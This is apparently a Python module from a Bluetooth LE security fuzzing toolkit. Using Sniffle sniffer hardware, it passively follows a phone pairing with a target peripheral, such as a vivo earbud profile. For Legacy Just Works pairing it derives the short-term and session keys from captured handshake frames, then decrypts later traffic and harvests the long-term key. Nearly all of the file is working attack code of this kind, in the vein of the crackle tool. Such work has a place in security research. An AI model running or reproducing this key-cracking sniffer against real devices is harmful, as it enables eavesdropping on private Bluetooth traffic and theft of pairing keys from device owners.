#!/usr/bin/env python3
# att-fuzz/roles/pairing_sniff.py
"""
被动嗅探配对与密钥收割(阶段四 4.1,攻击面密钥收割优先路线)。

单板被动嗅探:setup_sniffer(CONN_FOLLOW, 目标外设 MAC) -> 跟随手机↔外设的
配对连接 -> 全程抓包(pcap + jsonl 双录)。SMP(CID 0x0006)帧单独解析落台账;
配对方式帧级判定(SC vs Legacy Just Works);Legacy Just Works(TK=0)推导 STK ->
抓 LL_ENC_REQ/RSP(SKDm/SKDs/IVm/IVs)算会话密钥 -> AES-CCM 逐包解密后续流量
(含密钥分发帧,收割 LTK)。

设计边界(逐行核对 crackle/kernel smp.c + sniff_receiver.py):
- 字节序:SMP/crypto 字段空口序(小端)在 SmpExchange 内;调用 bt_crypto 时逆序
  成大端(c1/s1/会话密钥);CCM nonce 的 IV 部分保持空口序(crackle 约定)。
- 加密边界靠 MIC 兜底(cackle 同款):cipher 就绪后逐包尝试解密,MIC 过=加密、
  失败=明文(握手控制帧 ENC_REQ/RSP/START_ENC 等),无需精确卡时序。
- 方向:data_dir=0 -> C->P(master->slave, m2s);=1 -> P->C(s2m)。
- 计数器:每方向独立,空包也推进(重传靠 SN 位 + MIC 验证兜底)。

用法(经 runner.py):
  python3 att-fuzz/runner.py --target att-fuzz/targets/vivo_tws.json --sniff-pairing
  --sniff-duration 180 [--sniff-mac AA:BB:..]   # 覆盖目标档案 MAC
"""

import json
import logging
import time
from pathlib import Path
from struct import unpack

from sniffle.constants import BLE_ADV_AA
from sniffle.pcap import PcapBleWriter
from sniffle.packet_decoder import ConnectIndMessage, DataMessage, DPacketMessage
from sniffle.sniffle_hw import (DebugMessage, MeasurementMessage, PacketMessage,
                                SniffleHW, SnifferState, StateMessage, make_sniffle_hw,
                                PhyMode)

from core import bt_crypto
from core.serial_lock import guard as serial_guard
from core.smp import SmpExchange
from core.transport import _L2capReassembly

log = logging.getLogger("att-fuzz.pairing_sniff")

ATT_CID = 0x0004
SMP_CID = 0x0006
L2CAP_HDR_LEN = 4

# LL control opcodes(加密握手)
LL_ENC_REQ = 0x03
LL_ENC_RSP = 0x04
LL_START_ENC_REQ = 0x05
LL_START_ENC_RSP = 0x06


def _parse_mac(mac_str) -> bytes:
    """书写序 AA:BB:.. -> 线序(小端)6 字节(固件 cmd_mac 用线序)。"""
    mac = bytes.fromhex(str(mac_str).replace(":", "").replace("-", ""))
    return mac[::-1]


def run(target: dict, outdir: Path, serport=None, duration: float = 0.0,
        mac: str | None = None) -> int:
    outdir = Path(outdir)
    outdir.mkdir(parents=True, exist_ok=True)
    serport = serport or target.get("serport")
    with serial_guard(serport, "CLI pairing_sniff(被动嗅探)"):
        return _run_locked(target, outdir, serport, duration, mac)


def _run_locked(target, outdir, serport, duration, mac_override) -> int:
    hw = make_sniffle_hw(serport)
    # 目标 MAC:覆盖优先,否则档案 mac,search_string 兜底(照 sniff_receiver)
    if mac_override:
        wire_mac = _parse_mac(mac_override)
    elif target.get("mac"):
        wire_mac = _parse_mac(target["mac"])
    else:
        wire_mac = _find_target_by_string(hw, target["search_string"].encode("latin-1"))

    log.info("sniff target wire-mac=%s (CONN_FOLLOW)", wire_mac.hex())
    from sniffle.sniffle_hw import SnifferMode
    hw.setup_sniffer(mode=SnifferMode.CONN_FOLLOW, chan=37, targ_mac=wire_mac,
                     hop3=True, ext_adv=False, coded_phy=False, rssi_min=-128,
                     interval_preload=[], phy_preload=PhyMode.PHY_2M,
                     pause_done=True, validate_crc=True)
    hw.mark_and_flush()

    pcap = PcapBleWriter(str(outdir / "capture.pcap"))
    ledger_path = outdir / "sniff_ledger.jsonl"
    ex = SmpExchange()
    rx = _L2capReassembly()
    state = {"cipher": None, "encrypting": False, "skdm": None, "skds": None,
             "iv": None, "conn_no": 0}
    started = time.time()
    conn_ts = [None]

    def record(**fields):
        rec = {"ts": round(time.time(), 6), "conn": state["conn_no"]}
        rec.update(fields)
        with open(ledger_path, "a", encoding="utf-8") as fh:
            fh.write(json.dumps(rec, ensure_ascii=False) + "\n")

    record(kind="sniff_start", target=wire_mac.hex(), duration=duration)
    log.info("advertising-channel sniffing for target... (手机恢复出厂+重新配对)")

    try:
        while True:
            if duration and time.time() - started >= duration:
                log.info("duration reached, stopping")
                break
            try:
                msg = hw.recv_and_decode()
            except Exception as e:
                log.debug("recv error: %s", e)
                continue
            if msg is None:
                continue
            if isinstance(msg, PacketMessage):
                try:
                    dpkt = DPacketMessage.decode(msg)
                except Exception as e:
                    log.debug("decode error: %s", e)
                    continue
                try:
                    pcap.write_packet_message(dpkt)
                except Exception:
                    pass
                if isinstance(dpkt, ConnectIndMessage):
                    _on_connect(dpkt, ex, state, record, conn_ts)
                elif isinstance(dpkt, DataMessage):
                    _on_data(dpkt, ex, state, record, rx)
            elif isinstance(msg, StateMessage):
                record(kind="state", new=msg.new_state.name, old=msg.last_state.name)
                # 跟随连接结束(DATA -> PAUSED/STATIC)即一次连接完成
                if msg.new_state == SnifferState.PAUSED and conn_ts[0] is not None:
                    _on_disconnect(ex, state, record, conn_ts)
            elif isinstance(msg, MeasurementMessage):
                # TerminateMeasurement 等量测
                record(kind="measurement", type=type(msg).__name__,
                       value=getattr(msg, "value", None))
            elif isinstance(msg, DebugMessage):
                record(kind="fw_debug", msg=msg.msg)
    except KeyboardInterrupt:
        log.info("interrupted by user")
    finally:
        try:
            pcap.output.close()
        except Exception:
            pass
        log.info("=== sniff summary ===")
        log.info("connections seen: %d", state["conn_no"])
        s = ex.summary()
        for k, v in s.items():
            log.info("  %s: %s", k, v)
        record(kind="sniff_summary", **s)
        log.info("ledger: %s", ledger_path)
        log.info("pcap:   %s", outdir / "capture.pcap")
    return 0


def _on_connect(dpkt, ex, state, record, conn_ts):
    ia = bytes(dpkt.InitA); ra = bytes(dpkt.AdvA)
    iat = 1 if dpkt.TxAdd else 0   # InitA 类型
    rat = 1 if dpkt.RxAdd else 0   # AdvA 类型
    ex.set_addresses(ia, ra, iat, rat)
    state["conn_no"] += 1
    state["cipher"] = None
    state["encrypting"] = False
    state["skdm"] = state["skds"] = state["iv"] = None
    conn_ts[0] = time.time()
    log.info("conn#%d CONNECT_IND: %s->%s aa=%08X", state["conn_no"],
             ia.hex(), ra.hex(), dpkt.aa_conn)
    record(kind="connect", aa="%08X" % dpkt.aa_conn, init=ia.hex(), adv=ra.hex(),
           iat=iat, rat=rat, interval=dpkt.Interval)


def _on_data(dpkt, ex, state, record, rx):
    body = dpkt.body
    if len(body) < 2:
        return
    header_byte = body[0]
    data_len = dpkt.data_length
    payload = body[2:2 + data_len]
    llid = header_byte & 0x03
    direction = bt_crypto.DIR_M2S if dpkt.data_dir == 0 else bt_crypto.DIR_S2M
    sn = (header_byte >> 3) & 0x01

    if llid == 0x03:
        # LL control(明文,即使加密链路上控制帧也走明文 MIC 兜底)
        _on_ll_control(payload, ex, state, record)
        return

    # data PDU(llid 0/1/2):加密则先解密
    frag = payload
    if state["cipher"] is not None and len(payload) >= 4:
        ct, mic = payload[:-4], payload[-4:]
        pt = state["cipher"].decrypt_packet(header_byte, ct, mic, direction, sn)
        if pt is not None:
            state["encrypting"] = True
            frag = pt
            # 密文包体长度(含 MIC)与解密后明文长度不同 -- 重算无意义,直接用 frag
    sdu, cid, _trunc = rx.feed(llid, frag)
    if sdu is None:
        return
    if cid == SMP_CID:
        rec = ex.feed(sdu)   # sdu 已含 SMP opcode 起始
        record(kind="smp", dir=direction, op=rec.get("opcode"),
               name=rec.get("name"), pdu=sdu.hex()[:80])
        _maybe_finalize_keys(ex, state, record)
    elif cid == ATT_CID and state["encrypting"]:
        record(kind="att_decrypted", dir=direction, op=sdu[0] if sdu else None,
               pdu=sdu.hex()[:120])
        log.info("conn#%d decrypted ATT op=0x%02X: %s", state["conn_no"],
                 sdu[0] if sdu else -1, sdu.hex()[:40])


def _on_ll_control(payload, ex, state, record):
    if not payload:
        return
    opc = payload[0]
    if opc == LL_ENC_REQ and len(payload) >= 23:
        # opcode + Rand(8) + EDIV(2) + SKDm(8) + IVm(4)
        state["skdm"] = payload[11:19]      # 空口序
        state["iv"] = (state["iv"] or b"") + payload[19:23]   # IVm 段
        record(kind="ll_enc_req", rand=payload[1:9].hex(),
               ediv=payload[9:11].hex(), skdm=state["skdm"].hex(),
               ivm=payload[19:23].hex())
        log.info("LL_ENC_REQ: SKDm=%s IVm=%s", state["skdm"].hex(),
                 payload[19:23].hex())
        _maybe_finalize_keys(ex, state, record)
    elif opc == LL_ENC_RSP and len(payload) >= 13:
        # opcode + SKDs(8) + IVs(4)
        state["skds"] = payload[1:9]
        # IV = IVm || IVs(IVm 已在 ENC_REQ 存入 iv 的前 4 字节,这里补 IVs)
        ivm = state["iv"][:4] if state["iv"] else b"\x00" * 4
        state["iv"] = ivm + payload[9:13]
        record(kind="ll_enc_rsp", skds=state["skds"].hex(), ivs=payload[9:13].hex())
        log.info("LL_ENC_RSP: SKDs=%s IVs=%s", state["skds"].hex(),
                 payload[9:13].hex())
        _maybe_finalize_keys(ex, state, record)
    elif opc in (LL_START_ENC_REQ, LL_START_ENC_RSP):
        record(kind="ll_start_enc", op=opc)
        log.info("LL_START_ENC op=0x%02X (encryption engaged)", opc)


def _maybe_finalize_keys(ex, state, record):
    """STK + SKDm/SKDs + IV 齐全即构造解密 cipher(legacy Just Works 路径)。"""
    if state["cipher"] is not None:
        return
    stk = ex.derive_stk()
    if stk is None or state["skdm"] is None or state["skds"] is None \
            or state["iv"] is None or len(state["iv"]) < 8:
        return
    # session key = e(STK, SKDs_be || SKDm_be);IV 保持空口序
    from core.smp import _rev
    skdm_be = _rev(state["skdm"], 8); skds_be = _rev(state["skds"], 8)
    sessk = bt_crypto.session_key(stk, skdm_be, skds_be)
    state["cipher"] = bt_crypto.LLCipherState(sessk, state["iv"][:8])
    record(kind="cipher_ready", stk=stk.hex(), session_key=sessk.hex(),
           iv=state["iv"][:8].hex(), sc=ex.is_secure_connections)
    log.info("cipher ready: STK=%s sessionKey=%s iv=%s (SC=%s)",
             stk.hex(), sessk.hex(), state["iv"][:8].hex(),
             ex.is_secure_connections)


def _on_disconnect(ex, state, record, conn_ts):
    s = ex.summary()
    dur = round(time.time() - conn_ts[0], 3) if conn_ts[0] else None
    record(kind="conn_end", dur_s=dur, **s)
    log.info("conn#%d end: SC=%s legacy=%s stk=%s ltk=%s",
             state["conn_no"], s["secure_connections"], s["legacy_method"],
             s["stk"], s["ltk"])
    # 清空 ex 准备下一连接
    ex.__init__()


def _find_target_by_string(hw, search_str):
    """主动扫描按广播串找目标 MAC(照 sniff_receiver.get_mac_from_string)。"""
    from sniffle.sniffle_hw import SnifferMode
    hw.setup_sniffer(SnifferMode.ACTIVE_SCAN, ext_adv=True)
    hw.mark_and_flush()
    deadline = time.time() + 30
    while time.time() < deadline:
        msg = hw.recv_and_decode()
        from sniffle.packet_decoder import (AdvIndMessage, AdvDirectIndMessage,
                                            ScanRspMessage, AdvExtIndMessage)
        if isinstance(msg, (AdvIndMessage, AdvDirectIndMessage, ScanRspMessage,
                            AdvExtIndMessage)) and msg.AdvA is not None:
            if search_str in msg.body:
                return bytes(msg.AdvA)
    raise RuntimeError("target not found by advertisement string: %r" % search_str)
